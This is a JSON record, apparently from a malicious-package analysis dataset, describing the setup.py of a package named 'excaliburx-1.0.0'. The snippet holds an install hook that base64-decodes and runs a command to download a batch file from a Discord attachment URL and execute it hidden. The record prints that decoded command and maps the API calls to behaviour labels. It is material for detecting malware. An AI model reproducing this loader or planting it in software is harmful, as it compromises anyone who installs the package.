[
  {
    "pyfile": "setup.py",
    "code_snippet": "import base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE4ODk0OTk4ODkxOTczODQ1OC8xMTg4OTUwNTY3MzUyMDA4NzQ0L3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA==\"))\n\nfrom setuptools.command.install import install\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()",
    "pattern_analysis": {
      "api_sequence": [
        "base64.b64decode",
        "os.system",
        "setuptools.command.install.install.run",
        "os.system"
      ],
      "api_sequence_with_args": [
        "base64.b64decode(base64_bytes)",
        "os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE4ODk0OTk4ODkxOTczODQ1OC8xMTg4OTUwNTY3MzUyMDA4NzQ0L3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA==\"))",
        "setuptools.command.install.install.run(self)",
        "os.system(\"curl -s -o %temp%\\strings.bat https://cdn.discordapp.com/attachments/1188949988919738458/1188950567352008744/strings.bat && start /min cmd /c %temp%\\strings.bat\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE4ODk0OTk4ODkxOTczODQ1OC8xMTg4OTUwNTY3MzUyMDA4NzQ0L3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA==\"))\n\nfrom setuptools.command.install import install\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\n# Decoded shell command executed by os.system:\n# curl -s -o %temp%\\strings.bat https://cdn.discordapp.com/attachments/1188949988919738458/1188950567352008744/strings.bat && start /min cmd /c %temp%\\strings.bat"
    }
  },
  {
    "metadata": {
      "package_name": "excaliburx-1.0.0"
    }
  }
]